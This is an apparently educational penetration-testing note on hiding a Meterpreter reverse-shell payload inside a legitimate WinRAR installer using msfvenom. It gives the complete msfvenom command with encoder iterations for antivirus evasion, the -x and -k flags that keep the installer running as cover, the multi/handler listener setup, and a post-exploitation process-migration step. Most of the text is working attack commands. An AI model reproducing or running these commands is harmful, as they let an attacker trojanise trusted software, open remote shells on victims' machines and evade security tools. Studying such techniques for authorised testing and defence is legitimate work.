## The Concept

Instead of delivering a standalone payload file, inject the shellcode into a **legitimate executable** (like a real software installer). This changes the file's signature and adds a layer of social engineering legitimacy.

## Key MSFvenom Options

| Flag        | Purpose                                                                   |
| ----------- | ------------------------------------------------------------------------- |
| `-x <file>` | Specify the legitimate executable as the injection template               |
| `-k`        | Preserve the original executable's functionality (runs alongside payload) |
|             |                                                                           |

## Full Injection Command

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<kali-ip> LPORT=1234 \
  -e x86/shikata_ga_nai \
  -i 10 \
  -f exe \
  -x /root/Downloads/winrar602.exe \
  -o /root/WindowsPayloads/WinRAR.exe
```

## Setup Handler (unchanged)

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <kali-ip>
set LPORT 1234
run
```

## The `-k` Flag Caveat

Adding `-k` tries to preserve the original installer behavior — the target sees a real WinRAR setup while the payload runs in a new thread. However, many executables don't support this (error: _"template file doesn't have any exports to inject into"_), so it requires testing with different executables.

## Post-Exploitation: Process Migration

After getting a Meterpreter session, immediately migrate the process to prevent it from being killed:

```bash
run post/windows/manage/migrate
# Migrates payload into notepad.exe (or similar stable process)
```

## Limitations

Modern AV is sophisticated enough to detect MSFvenom-generated payloads even when injected into legitimate executables. This technique works better against older/basic AV and is primarily useful for understanding the underlying concepts of payload delivery and evasion.
